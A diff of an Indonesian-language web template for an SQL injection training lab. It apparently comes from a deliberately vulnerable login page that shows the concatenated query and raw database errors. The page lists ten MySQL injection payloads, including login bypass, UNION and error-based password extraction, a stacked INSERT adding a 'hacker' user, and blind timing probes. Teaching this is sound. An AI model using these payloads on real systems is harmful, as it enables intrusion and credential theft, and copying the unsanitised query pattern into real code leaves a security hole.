@@ -2,429 +2,383 @@
 endblock %} {% block container_style %}max-width: 820px;{% endblock %} {% block
 head_extra %}
 <style>
-    .cheat-item {
-        background: rgba(0, 0, 0, 0.12);
-        border: 1px solid var(--border-color);
-        border-left: 3px solid var(--brand-danger);
-        border-radius: 6px;
-        padding: 14px 16px;
-        margin-bottom: 12px;
-        transition: all var(--transition-smooth);
-    }
-    .cheat-item:hover {
-        border-color: var(--brand-danger-glow);
-        background: rgba(239, 68, 68, 0.04);
-        box-shadow: var(--shadow-sm);
-    }
-    .theme-light .cheat-item {
-        background: var(--bg-gray-subtle);
-        border-left-color: var(--brand-danger);
-    }
-    .cheat-pre {
-        margin-top: 8px;
-        margin-bottom: 0;
-        font-size: 0.8rem;
-        line-height: 1.65;
-        background: var(--bg-input);
-        border: 1px solid var(--border-color);
-        box-shadow: none;
-        padding: 10px 14px;
-        white-space: pre-wrap;
-        word-break: break-all;
-        border-radius: 6px;
-    }
-    .qs {
-        color: var(--text-secondary);
-    }
-    .qi {
-        color: var(--brand-danger);
-        background: var(--bg-danger-subtle);
-        border-radius: 4px;
-        padding: 2px 6px;
-        margin: 0 2px;
-        border: 1px solid var(--brand-danger-glow);
-    }
-    .qco {
-        color: var(--text-muted);
-        font-style: italic;
-    }
+  .cheat-item {
+    background: rgba(0, 0, 0, 0.12);
+    border: 1px solid var(--border-color);
+    border-left: 3px solid var(--brand-danger);
+    border-radius: 6px;
+    padding: 14px 16px;
+    margin-bottom: 12px;
+    transition: all var(--transition-smooth);
+  }
+  .cheat-item:hover {
+    border-color: var(--brand-danger-glow);
+    background: rgba(239, 68, 68, 0.04);
+    box-shadow: var(--shadow-sm);
+  }
+  .theme-light .cheat-item {
+    background: var(--bg-gray-subtle);
+    border-left-color: var(--brand-danger);
+  }
+  .cheat-pre {
+    margin-top: 8px;
+    margin-bottom: 0;
+    font-size: 0.8rem;
+    line-height: 1.65;
+    background: var(--bg-input);
+    border: 1px solid var(--border-color);
+    box-shadow: none;
+    padding: 10px 14px;
+    white-space: pre-wrap;
+    word-break: break-all;
+    border-radius: 6px;
+  }
+  .qs {
+    color: var(--text-secondary);
+  }
+  .qi {
+    color: var(--brand-danger);
+    background: var(--bg-danger-subtle);
+    border-radius: 4px;
+    padding: 2px 6px;
+    margin: 0 2px;
+    border: 1px solid var(--brand-danger-glow);
+  }
+  .qco {
+    color: var(--text-muted);
+    font-style: italic;
+  }
 
-    .table-container {
-        border-radius: 6px;
-        overflow: hidden;
-        border: 1px solid var(--border-color);
-    }
+  .table-container {
+    border-radius: 6px;
+    overflow: hidden;
+    border: 1px solid var(--border-color);
+  }
 
-    .cheat-header {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        flex-wrap: wrap;
-        gap: 8px;
-    }
-    .cheat-meta {
-        display: flex;
-        align-items: center;
-        gap: 10px;
-    }
+  .cheat-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 8px;
+  }
+  .cheat-meta {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
 
-    .try-btn {
-        background: var(--bg-danger-subtle);
-        border: 1px solid var(--brand-danger-glow);
-        color: var(--brand-danger);
-        font-size: 0.72rem;
-        font-weight: 700;
-        padding: 6px 14px;
-        border-radius: 4px;
-        cursor: pointer;
-        transition: all var(--transition-smooth);
-        text-transform: uppercase;
-        letter-spacing: 0.04em;
-        flex-shrink: 0;
-        display: inline-flex;
-        align-items: center;
-        gap: 6px;
-    }
-    .try-btn:hover {
-        background: var(--brand-danger);
-        color: white;
-        border-color: var(--brand-danger);
-    }
-    .field-tag {
-        font-size: 0.68rem;
-        font-weight: 700;
-        padding: 2px 7px;
-        border-radius: 4px;
-        text-transform: uppercase;
-        letter-spacing: 0.06em;
-        background: var(--bg-danger-subtle);
-        color: var(--brand-danger);
-        border: 1px solid var(--brand-danger-glow);
-    }
-    .note-tag {
-        font-size: 0.72rem;
-        color: var(--brand-danger);
-        background: var(--bg-danger-subtle);
-        border: 1px solid var(--brand-danger-glow);
-        border-left: 3px solid var(--brand-danger);
-        padding: 6px 10px;
-        border-radius: 4px;
-        margin-top: 8px;
-        display: flex;
-        align-items: center;
-        gap: 8px;
-    }
+  .try-btn {
+    background: var(--bg-danger-subtle);
+    border: 1px solid var(--brand-danger-glow);
+    color: var(--brand-danger);
+    font-size: 0.72rem;
+    font-weight: 700;
+    padding: 6px 14px;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: all var(--transition-smooth);
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    flex-shrink: 0;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .try-btn:hover {
+    background: var(--brand-danger);
+    color: white;
+    border-color: var(--brand-danger);
+  }
+  .field-tag {
+    font-size: 0.68rem;
+    font-weight: 700;
+    padding: 2px 7px;
+    border-radius: 4px;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    background: var(--bg-danger-subtle);
+    color: var(--brand-danger);
+    border: 1px solid var(--brand-danger-glow);
+  }
+  .note-tag {
+    font-size: 0.72rem;
+    color: var(--brand-danger);
+    background: var(--bg-danger-subtle);
+    border: 1px solid var(--brand-danger-glow);
+    border-left: 3px solid var(--brand-danger);
+    padding: 6px 10px;
+    border-radius: 4px;
+    margin-top: 8px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
 </style>
 {% endblock %} {% block content %}
 <!-- Page heading -->
 <div class="d-flex align-items-center mb-4">
-    <span class="page-title-icon inline-svg-icon">
-        <svg
-            xmlns="http://www.w3.org/2000/svg"
-            viewBox="0 0 24 24"
-            stroke-width="2"
-            stroke-linecap="round"
-            stroke-linejoin="round"
-        >
-            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-            <path d="M7 11V7a5 5 0 0 1 9.9-1"></path>
-        </svg>
-    </span>
-    <h2 class="mb-0 mr-3 font-weight-bold" style="color: var(--brand-danger)">
-        Login Bypass Experiment
-    </h2>
-    <span class="badge-vuln">SQL Injection Lab</span>
+  <span class="page-title-icon inline-svg-icon">
+    <svg
+      xmlns="http://www.w3.org/2000/svg"
+      viewBox="0 0 24 24"
+      stroke-width="2"
+      stroke-linecap="round"
+      stroke-linejoin="round"
+    >
+      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+      <path d="M7 11V7a5 5 0 0 1 9.9-1"></path>
+    </svg>
+  </span>
+  <h2 class="mb-0 mr-3 font-weight-bold" style="color: var(--brand-danger)">
+    Login Rentan
+  </h2>
 </div>
 
 <!-- Auth result banner -->
 {% if auth_status == 'failed' %}
 <div class="alert alert-danger mb-4" role="alert">
-    <strong>Gagal Mengautentikasi</strong><br />
-    Query berhasil dieksekusi, tetapi database tidak mengembalikan rekaman user
-    yang cocok.
+  <strong>Gagal Mengautentikasi</strong><br />
+  Query berhasil dieksekusi, tetapi database tidak mengembalikan rekaman user
+  yang cocok.
 </div>
 {% elif auth_status == 'error' %}
 <div class="card mb-4" style="border-color: var(--brand-warning)">
-    <div class="card-header hdr-yellow">
-        <strong>Runtime SQL Error</strong>
+  <div class="card-header hdr-yellow">
+    <strong>Runtime SQL Error</strong>
+  </div>
+  <div class="card-body p-3">
+    <div class="alert alert-warning mb-0" role="alert" style="box-shadow: none">
+      <strong>MySQLError:</strong> {{ sql_error_message }}
     </div>
-    <div class="card-body p-3">
-        <div
-            class="alert alert-warning mb-0"
-            role="alert"
-            style="box-shadow: none"
-        >
-            <strong>MySQLError:</strong> {{ sql_error_message }}
-        </div>
-    </div>
+  </div>
 </div>
 {% elif auth_status == 'idle' %}
 <div class="alert alert-info mb-4" role="alert">
-    <strong>Mode Eksperimen Terbuka (Vulnerable App)</strong><br />
-    Aplikasi mem-bypass autentikasi jika kueri mengembalikan minimal 1 baris
-    record. Cobalah muatan SQL Injection seperti <code>' OR '1'='1</code>.
+  <strong>Mode Eksperimen Terbuka (Vulnerable App)</strong><br />
+  Aplikasi mem-bypass autentikasi jika kueri mengembalikan minimal 1 baris
+  record. Cobalah muatan SQL Injection seperti <code>' OR '1'='1</code>.
 </div>
 {% endif %}
 
 <!-- Constructed query display -->
 {% if executed_query is not none %}
 <div class="card mb-4" style="border-color: var(--brand-danger-glow)">
-    <div class="card-header hdr-red">
-        <strong>SQL Query Terbentuk (Suntikan Payload)</strong>
-        <span style="font-size: 0.78rem; font-weight: 500; opacity: 0.85">
-            f-string concatenation
-        </span>
-    </div>
-    <div class="card-body p-4">
-        <pre><span class="inject-static">SELECT * FROM users WHERE username = </span><span class="inject-quote">'</span><span class="inject-val">{{ raw_username }}</span><span class="inject-quote">'</span><span class="inject-static"> AND password = </span><span class="inject-quote">'</span><span class="inject-val">{{ raw_password }}</span><span class="inject-quote">'</span></pre>
-        <div
-            class="mt-3 d-flex gap-4"
-            style="font-size: 0.8rem; color: var(--text-secondary); gap: 16px"
+  <div class="card-header hdr-red">
+    <strong>SQL Query Terbentuk (Suntikan Payload)</strong>
+    <span style="font-size: 0.78rem; font-weight: 500; opacity: 0.85">
+      f-string concatenation
+    </span>
+  </div>
+  <div class="card-body p-4">
+    <pre><span class="inject-static">SELECT * FROM users WHERE username = </span><span class="inject-quote">'</span><span class="inject-val">{{ raw_username }}</span><span class="inject-quote">'</span><span class="inject-static"> AND password = </span><span class="inject-quote">'</span><span class="inject-val">{{ raw_password }}</span><span class="inject-quote">'</span></pre>
+    <div
+      class="mt-3 d-flex gap-4"
+      style="font-size: 0.8rem; color: var(--text-secondary); gap: 16px"
+    >
+      <div>
+        <span class="inject-val" style="padding: 1px 4px; font-weight: normal"
+          >Merah</span
         >
-            <div>
-                <span
-                    class="inject-val"
-                    style="padding: 1px 4px; font-weight: normal"
-                    >Merah</span
-                >
-                = Input dinamis dari user
-            </div>
-            <div>
-                <span class="inject-quote" style="font-weight: normal"
-                    >Kuning</span
-                >
-                = Tanda kutip tunggal pembungkus kueri
-            </div>
-        </div>
+        = Input dinamis dari user
+      </div>
+      <div>
+        <span class="inject-quote" style="font-weight: normal">Kuning</span>
+        = Tanda kutip tunggal pembungkus kueri
+      </div>
     </div>
+  </div>
 </div>
 {% endif %}
 
 <!-- Runtime query result -->
 {% if executed_query is not none and auth_status != 'error' %}
 <div class="card mb-4">
-    <div class="card-header hdr-green">
-        <strong>Database Record Snapshot</strong>
-        <span
-            class="badge badge-success"
-            style="font-size: 0.75rem; font-weight: 600"
-        >
-            {{ query_rows|length }} Baris Terbuka
-        </span>
+  <div class="card-header hdr-green">
+    <strong>Database Record Snapshot</strong>
+    <span
+      class="badge badge-success"
+      style="font-size: 0.75rem; font-weight: 600"
+    >
+      {{ query_rows|length }} Baris Terbuka
+    </span>
+  </div>
+  <div class="card-body p-3">
+    {% if query_columns and query_rows %}
+    <div class="table-responsive table-container">
+      <table class="table mb-0">
+        <thead>
+          <tr>
+            {% for col in query_columns %}
+            <th>{{ col }}</th>
+            {% endfor %}
+          </tr>
+        </thead>
+        <tbody>
+          {% for row in query_rows %}
+          <tr>
+            {% for val in row %}
+            <td>{{ val }}</td>
+            {% endfor %}
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
     </div>
-    <div class="card-body p-3">
-        {% if query_columns and query_rows %}
-        <div class="table-responsive table-container">
-            <table class="table mb-0">
-                <thead>
-                    <tr>
-                        {% for col in query_columns %}
-                        <th>{{ col }}</th>
-                        {% endfor %}
-                    </tr>
-                </thead>
-                <tbody>
-                    {% for row in query_rows %}
-                    <tr>
-                        {% for val in row %}
-                        <td>{{ val }}</td>
-                        {% endfor %}
-                    </tr>
-                    {% endfor %}
-                </tbody>
-            </table>
-        </div>
-        {% else %}
-        <div class="alert alert-info m-0" role="alert" style="box-shadow: none">
-            Kueri berhasil dieksekusi, namun database mengembalikan hasil yang
-            kosong (0 baris).
-        </div>
-        {% endif %}
-        <!-- Letakkan di dalam form login atau di area yang mudah dilihat -->
-        {% if sql_error_message %}
-        <div
-            class="alert alert-danger"
-            style="border: 2px solid red; padding: 10px; background: #ffe6e6"
-        >
-            <strong>Database Error:</strong> {{ sql_error_message }}
-        </div>
-        <hr />
-        <details>
-            <summary>Executed Query (Debug)</summary>
-            <pre style="background: #eee; padding: 5px">
-{{ executed_query }}</pre
-            >
-        </details>
-        {% endif %}
+    {% else %}
+    <div class="alert alert-info m-0" role="alert" style="box-shadow: none">
+      Kueri berhasil dieksekusi, namun database mengembalikan hasil yang kosong
+      (0 baris).
     </div>
+    {% endif %}
+    <!-- Letakkan di dalam form login atau di area yang mudah dilihat -->
+    {% if sql_error_message %}
+    <div
+      class="alert alert-danger"
+      style="border: 2px solid red; padding: 10px; background: #ffe6e6"
+    >
+      <strong>Database Error:</strong> {{ sql_error_message }}
+    </div>
+    <hr />
+    <details>
+      <summary>Executed Query (Debug)</summary>
+      <pre style="background: #eee; padding: 5px">{{ executed_query }}</pre>
+    </details>
+    {% endif %}
+  </div>
 </div>
 {% endif %}
 
 <!-- Login form -->
 <div class="card mb-5">
-    <div class="card-header hdr-gray">
-        <strong>Vulnerable Login Interface</strong>
-    </div>
-    <div class="card-body p-4">
-        <form method="POST" autocomplete="off" id="loginForm">
-            <input
-                type="hidden"
-                name="_client_sent_time"
-                id="client_sent_time"
-            />
-            <div class="form-group mb-4">
-                <label for="username">
-                    Parameter Username
-                    <span
-                        class="badge-vuln ml-2"
-                        style="
-                            font-size: 0.65rem;
-                            border-radius: 4px;
-                            font-weight: 700;
-                            padding: 2px 6px;
-                        "
-                        >RAW STRING</span
-                    >
-                </label>
-                <input
-                    type="text"
-                    class="form-control"
-                    id="username"
-                    name="username"
-                    value="{{ raw_username }}"
-                    placeholder="Payload, contoh: ' OR '1'='1' --"
-                    autofocus
-                />
-                <small
-                    class="mt-2 d-block"
-                    style="color: var(--text-muted); font-size: 0.75rem"
-                >
-                    Nilai diserap langsung ke variabel SQL tanpa filterisasi.
-                    Sangat rentan terhadap SQL Injection.
-                </small>
-            </div>
+  <div class="card-header hdr-gray">
+    <strong>Vulnerable Login Interface</strong>
+  </div>
+  <div class="card-body p-4">
+    <form method="POST" autocomplete="off" id="loginForm">
+      <div class="form-group mb-4">
+        <label for="username"> Username</label>
+        <input
+          type="text"
+          class="form-control"
+          id="username"
+          name="username"
+          value="{{ raw_username }}"
+          placeholder="Payload, contoh: ' OR '1'='1' --"
+          autofocus
+        />
+        <small
+          class="mt-2 d-block"
+          style="color: var(--text-muted); font-size: 0.75rem"
+        >
+          Nilai diserap langsung ke variabel SQL tanpa filterisasi. Sangat
+          rentan terhadap SQL Injection.
+        </small>
+      </div>
 
-            <div class="form-group mb-4">
-                <label for="password">Parameter Password</label>
-                <input
-                    type="text"
-                    class="form-control"
-                    id="password"
-                    name="password"
-                    value="{{ raw_password }}"
-                    placeholder="(Diabaikan oleh engine jika ter-bypass di atas)"
-                />
-            </div>
+      <div class="form-group mb-4">
+        <label for="password">Password</label>
+        <input
+          type="text"
+          class="form-control"
+          id="password"
+          name="password"
+          value="{{ raw_password }}"
+          placeholder="(Diabaikan oleh engine jika ter-bypass di atas)"
+        />
+      </div>
 
-            <button type="submit" class="btn btn-exec btn-danger mt-2">
-                Jalankan Kueri Eksperimen
-            </button>
-        </form>
-    </div>
+      <button type="submit" class="btn btn-exec btn-danger mt-2">
+        Masuk
+      </button>
+    </form>
+  </div>
 </div>
 
 <!-- SQLi cheatsheet -->
 <div class="card">
-    <div class="card-header hdr-blue">
-        <strong>Daftar Payload SQL Injection (Referensi Akademik)</strong>
-        <span
-            style="
-                font-size: 0.75rem;
-                color: var(--text-secondary);
-                font-weight: 400;
-            "
-            >Kategori MySQL &bull; Klik <em>Gunakan</em> untuk menyalin payload
-            ke form</span
-        >
-    </div>
-    <div class="card-body pt-2 pb-2">
-        {% set cheats = [ ( "Error Based", "Memancing error XML parsing untuk
-        menampilkan data sensitif", "' AND updatexml(1,concat(0x3a,(SELECT
-        password FROM users LIMIT 1)),1) -- ", "x", "", "Memicu error UpdateXML
-        yang menampilkan isi field password." ), ( "Illegal Query", "Menjalankan
-        query dengan sintaks tidak valid / illegal", "' OR (SELECT * FROM
-        (SELECT 1)a JOIN (SELECT 2)b) -- ", "x", "", "Memicu error subquery atau
-        join yang tidak valid." ), ( "Union Based", "Menggabungkan hasil query
-        asli dengan query SELECT tambahan", "' UNION SELECT 1, username,
-        password FROM users -- ", "x", "", "Mengekstrak data dari tabel users
-        secara langsung ke layar." ), ( "Tautology", "Menggunakan kondisi logika
-        OR yang selalu bernilai TRUE", "' OR '1'='1' -- ", "x", "", "Bypass
-        login karena kueri menghasilkan nilai TRUE." ), ( "Stored Procedure",
-        "Memanggil fungsi atau prosedur bawaan database engine", "admin'; CALL
-        sys.ps_setup_save() -- ", "x", "", "Mengeksekusi stored procedure bawaan
-        database MySQL." ), ( "End-of-Line Comment", "Memotong sisa kueri
-        password menggunakan tanda komentar", "admin' -- ", "x", "",
-        "Mengabaikan verifikasi password dengan memotong sisa query." ), (
-        "Inline Comments", "Menggunakan komentar inline /**/ untuk memanipulasi
-        parsing", "admin'/**/OR/**/'1'='1", "x", "", "Mengelabui pemrosesan
-        parser atau WAF menggunakan inline comments." ), ( "Stacked Queries",
-        "Menjalankan banyak kueri SQL menggunakan pemisah titik koma", "admin';
-        INSERT INTO users (username, password) VALUES ('hacker', 'hacker123');
-        -- ", "x", "", "Menambahkan kueri INSERT baru setelah kueri login." ), (
-        "Time-based blind", "Mengetahui status kondisi logika via delay respon
-        (sleep)", "' AND IF(1=1, sleep(5), 0) -- ", "x", "", "Menunda respon
-        server selama 5 detik jika kondisi bernilai benar." ), ( "Boolean-Based
-        Blind", "Menguji logika kondisi BENAR/SALAH untuk menebak data", "' AND
-        (SELECT 1 FROM users WHERE username='admin')='1' -- ", "x", "",
-        "Memeriksa apakah user 'admin' ada dengan mengamati respon sukses." ) ]
-        %} {% for name, desc, payload_user, payload_pass, badge, note in cheats
-        %}
-        <div class="cheat-item">
-            <div class="cheat-header">
-                <div class="cheat-meta">
-                    <span class="badge-tech">{{ name }}</span>
-                    {% if badge %}<span class="field-tag">{{ badge }}</span>{%
-                    endif %}
-                    <span
-                        style="color: var(--text-secondary); font-size: 0.78rem"
-                        >{{ desc }}</span
-                    >
-                </div>
-                <button
-                    class="try-btn js-cheat-btn"
-                    type="button"
-                    data-username="{{ payload_user }}"
-                    data-password="{{ payload_pass }}"
-                >
-                    Gunakan
-                </button>
-            </div>
-            <pre
-                class="cheat-pre"
-            ><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">{{ payload_user }}</span><span class="qs">' AND password = '</span><span class="qi" style="color: var(--brand-warning);">{{ payload_pass }}</span><span class="qs">'</span></pre>
-            {% if note %}
-            <div class="note-tag">
-                <span style="font-style: normal; font-size: 0.9rem">💡</span>
-                <span>{{ note }}</span>
-            </div>
-            {% endif %}
+  <div class="card-header hdr-blue">
+    <strong>Daftar Payload SQL Injection (Referensi Akademik)</strong>
+    <span
+      style="font-size: 0.75rem; color: var(--text-secondary); font-weight: 400"
+      >Kategori MySQL &bull; Klik <em>Gunakan</em> untuk menyalin payload ke
+      form</span
+    >
+  </div>
+  <div class="card-body pt-2 pb-2">
+    {% set cheats = [ ( "Error Based", "Memancing error XML parsing untuk
+    menampilkan data sensitif", "' AND updatexml(1,concat(0x3a,(SELECT password
+    FROM users LIMIT 1)),1) -- ", "x", "", "Memicu error UpdateXML yang
+    menampilkan isi field password." ), ( "Illegal Query", "Menjalankan query
+    dengan sintaks tidak valid / illegal", "' OR (SELECT * FROM (SELECT 1)a JOIN
+    (SELECT 2)b) -- ", "x", "", "Memicu error subquery atau join yang tidak
+    valid." ), ( "Union Based", "Menggabungkan hasil query asli dengan query
+    SELECT tambahan", "' UNION SELECT 1, username, password FROM users -- ",
+    "x", "", "Mengekstrak data dari tabel users secara langsung ke layar." ), (
+    "Tautology", "Menggunakan kondisi logika OR yang selalu bernilai TRUE", "'
+    OR '1'='1' -- ", "x", "", "Bypass login karena kueri menghasilkan nilai
+    TRUE." ), ( "Stored Procedure", "Memanggil fungsi atau prosedur bawaan
+    database engine", "admin'; CALL sys.ps_setup_save() -- ", "x", "",
+    "Mengeksekusi stored procedure bawaan database MySQL." ), ( "End-of-Line
+    Comment", "Memotong sisa kueri password menggunakan tanda komentar", "admin'
+    -- ", "x", "", "Mengabaikan verifikasi password dengan memotong sisa query."
+    ), ( "Inline Comments", "Menggunakan komentar inline /**/ untuk memanipulasi
+    parsing", "admin'/**/OR/**/'1'='1", "x", "", "Mengelabui pemrosesan parser
+    atau WAF menggunakan inline comments." ), ( "Stacked Queries", "Menjalankan
+    banyak kueri SQL menggunakan pemisah titik koma", "admin'; INSERT INTO users
+    (username, password) VALUES ('hacker', 'hacker123'); -- ", "x", "",
+    "Menambahkan kueri INSERT baru setelah kueri login." ), ( "Time-based
+    blind", "Mengetahui status kondisi logika via delay respon (sleep)", "' AND
+    IF(1=1, sleep(5), 0) -- ", "x", "", "Menunda respon server selama 5 detik
+    jika kondisi bernilai benar." ), ( "Boolean-Based Blind", "Menguji logika
+    kondisi BENAR/SALAH untuk menebak data", "' AND (SELECT 1 FROM users WHERE
+    username='admin')='1' -- ", "x", "", "Memeriksa apakah user 'admin' ada
+    dengan mengamati respon sukses." ) ] %} {% for name, desc, payload_user,
+    payload_pass, badge, note in cheats %}
+    <div class="cheat-item">
+      <div class="cheat-header">
+        <div class="cheat-meta">
+          <span class="badge-tech">{{ name }}</span>
+          {% if badge %}<span class="field-tag">{{ badge }}</span>{% endif %}
+          <span style="color: var(--text-secondary); font-size: 0.78rem"
+            >{{ desc }}</span
+          >
         </div>
-        {% endfor %}
+        <button
+          class="try-btn js-cheat-btn"
+          type="button"
+          data-username="{{ payload_user }}"
+          data-password="{{ payload_pass }}"
+        >
+          Gunakan
+        </button>
+      </div>
+      <pre
+        class="cheat-pre"
+      ><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">{{ payload_user }}</span><span class="qs">' AND password = '</span><span class="qi" style="color: var(--brand-warning);">{{ payload_pass }}</span><span class="qs">'</span></pre>
+      {% if note %}
+      <div class="note-tag">
+        <span style="font-style: normal; font-size: 0.9rem">💡</span>
+        <span>{{ note }}</span>
+      </div>
+      {% endif %}
     </div>
+    {% endfor %}
+  </div>
 </div>
 {% endblock %} {% block scripts %}
 <script>
-    (function () {
-        const usernameInput = document.getElementById("username");
-        const passwordInput = document.getElementById("password");
+  (function () {
+    const usernameInput = document.getElementById("username");
+    const passwordInput = document.getElementById("password");
 
-        document.querySelectorAll(".js-cheat-btn").forEach((button) => {
-            button.addEventListener("click", () => {
-                usernameInput.value = button.dataset.username || "";
-                passwordInput.value = button.dataset.password || "";
-                usernameInput.focus();
-            });
-        });
-
-        const loginForm = document.getElementById("loginForm");
-        if (loginForm) {
-            loginForm.addEventListener("submit", () => {
-                const t = document.getElementById("client_sent_time");
-                if (t) {
-                    t.value = Date.now();
-                }
-            });
-        }
-    })();
+    document.querySelectorAll(".js-cheat-btn").forEach((button) => {
+      button.addEventListener("click", () => {
+        usernameInput.value = button.dataset.username || "";
+        passwordInput.value = button.dataset.password || "";
+        usernameInput.focus();
+      });
+    });
+  })();
 </script>
 {% endblock %}
